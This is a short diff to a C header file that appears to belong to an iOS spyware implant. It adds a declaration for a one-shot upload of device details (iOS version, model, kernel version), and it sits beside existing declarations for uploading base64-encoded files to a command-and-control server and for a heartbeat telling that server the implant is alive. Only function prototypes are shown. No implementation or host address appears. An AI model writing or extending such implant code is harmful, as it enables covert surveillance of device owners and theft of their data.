@@ -18,6 +18,9 @@
 void upload_to_c2(const char *category, const char *path,
                   const char *description, const char *b64data);
 
+/* One-shot device info upload (iOS version, model, kernel version) */
+void upload_device_info(void);
+
 /* Heartbeat — lets C2 know the implant is alive */
 void c2_heartbeat(void);
 
